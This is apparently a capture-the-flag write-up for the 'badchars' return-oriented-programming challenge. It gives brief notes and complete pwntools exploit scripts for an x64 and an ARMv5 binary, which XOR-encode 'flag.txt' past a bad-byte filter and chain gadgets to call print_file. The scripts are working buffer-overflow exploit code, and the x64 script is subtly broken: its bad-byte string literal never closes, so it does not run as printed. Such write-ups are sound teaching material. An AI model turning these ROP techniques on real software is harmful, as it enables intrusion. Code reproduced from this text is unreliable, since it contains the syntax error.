## x64
---
- This challenge was similar to the previous but it introduces the concept of bad bytes
- Our input is screened for any occurrence of the bytes `xga.`, all of which are present in `flag.txt`
- We need to utilize an xor gadget, but the only ones available are byte-wise operations
	- We need to ensure that the buffer addresses we pass to be XORd byte-by-byte also don't include the bad bytes `xga.`
	- I tried using the `data_start` address but as we increment it would eventually contain a bad byte
	- Resolved by using `bss_start` instead
### solve
```python
#!/usr/bin/env python3

from pwn import *

exe = "./badchars"
elf = context.binary = ELF(exe, checksec=False)
context.terminal = ["tmux", "splitw", "-h"]
badchars = b"xga.

goal = b"flag.txt"
for xor_val in range(1, 256):
    invalid = False
    filename = xor(goal, xor_val)
    for badchar in badchars:
        if badchar in filename:
            invalid = True
            break
    if invalid:
        continue
    else:
        break

# ropper -b 7867612e --file ./badchars
# 0x0000000000400628: xor byte ptr [r15], r14b; ret;
# 0x0000000000400634: mov qword ptr [r13], r12; ret;
# 0x000000000040069c: pop r12; pop r13; pop r14; pop r15; ret;
# 0x00000000004006a2: pop r15; ret;
xor_r15_r14b = 0x400628
stm_r13_r12 = 0x400634
pop_r12_r13_r14_r15 = 0x40069C
pop_r15 = 0x4006A2

offset = 40
bss = 0x601038

rop = ROP(exe)
rop.raw(pop_r12_r13_r14_r15)
rop.raw(filename) # popped into r12
rop.raw(bss) # popped into r13
rop.raw(xor_val) # popped into r14
rop.raw(bss) # popped into r15
rop.raw(stm_r13_r12) # store filename into bss
# xor filename byte-by-byte with xor_val
for i in range(len(filename)):
    rop.raw(pop_r15)
    rop.raw(bss + i)
    rop.raw(xor_r15_r14b)
# put flag.txt into rdi
rop.raw(rop.rdi.address)
rop.raw(bss)
# call print_file with flag.txt
rop.raw(elf.sym.print_file)

payload = flat({offset: rop.chain()})

context.log_level = "debug"
io = gdb.debug(exe, "b pwnme\nc")
io.sendafter(b"> ", payload)
io.interactive()
```

## ARMv5
---
```python
#!/usr/bin/env python3

from pwn import *

exe = "./badchars_armv5"
elf = context.binary = ELF(exe, checksec=False)
context.terminal = ["tmux", "splitw", "-h"]

badchars = b"xga."
start = b"flag.txt"
for i in range(1, 256):
    string = xor(start, i)
    if any(b in string for b in badchars):
        continue
    break

# 0x10618: ldr r1, [r5]; eor r1, r1, r6; str r1, [r5]; pop {r0, pc};
# 0x105fc: pop {r0, pc};
# 0x10614: pop {r5, r6, pc};

data = 0x21024

payload = b""
for i in range(0, len(string), 4):
    payload += p32(0x10614) # pop {r5, r6, pc}
    payload += p32(data + i)
    payload += p32(0x02020202)
    payload += p32(0x10618) # ldr r1, [r5]; eor r1, r1, r6; str r1, [r5]; pop {r0, pc};
    payload += p32(0)
    payload += p32(0x10614) # pop {r5, r6, pc}

    payload += p32(data + i)
    payload += string[i:i+4]
    payload += p32(0x10618) # ldr r1, [r5]; eor r1, r1, r6; str r1, [r5]; pop {r0, pc};
    payload += p32(data)

payload += p32(elf.sym.print_file)

offset = 44
payload = flat({offset: payload}, filler=b"\x00")

context.log_level = "debug"
io = gdb.debug(exe, "b *pwnme+328\nc")
io.sendafter(b"> ", payload)
io.interactive()
```

